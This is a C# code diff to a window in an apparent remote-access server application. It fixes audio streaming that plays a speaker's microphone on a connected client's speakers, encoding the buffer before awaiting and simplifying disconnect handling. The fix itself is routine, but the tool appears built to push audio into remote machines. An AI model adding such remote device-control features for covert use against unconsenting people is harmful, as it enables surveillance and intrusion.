@@ -104,14 +104,14 @@ public partial class SpeakToClientWindow : ThemedWindow
         if (!_speaking || args.BytesRecorded == 0) return;
         _bytesSent += args.BytesRecorded;
 
-        var chunk = new byte[args.BytesRecorded];
-        Array.Copy(args.Buffer, chunk, args.BytesRecorded);
+        // Encode synchronously before first await — args.Buffer is only valid until this method yields
         float peak = ComputePeak(args.Buffer, args.BytesRecorded);
+        string b64  = Convert.ToBase64String(args.Buffer, 0, args.BytesRecorded);
 
         await _server.SendToClient(_clientId, new Packet
         {
             Type = PacketType.SpeakerInjectData,
-            Data = JsonConvert.SerializeObject(new SpeakerDataPacket { Data = Convert.ToBase64String(chunk) })
+            Data = JsonConvert.SerializeObject(new SpeakerDataPacket { Data = b64 })
         });
 
         long kb = _bytesSent / 1024;
@@ -157,13 +157,9 @@ public partial class SpeakToClientWindow : ThemedWindow
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
         if (c.Id != _clientId) return;
-        Dispatcher.BeginInvoke(async () =>
+        Dispatcher.BeginInvoke(() =>
         {
-            if (_speaking)
-            {
-                StopInternal();
-                await _server.SendToClient(_clientId, new Packet { Type = PacketType.SpeakerInjectStop });
-            }
+            if (_speaking) StopInternal();
             TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
         });
     }
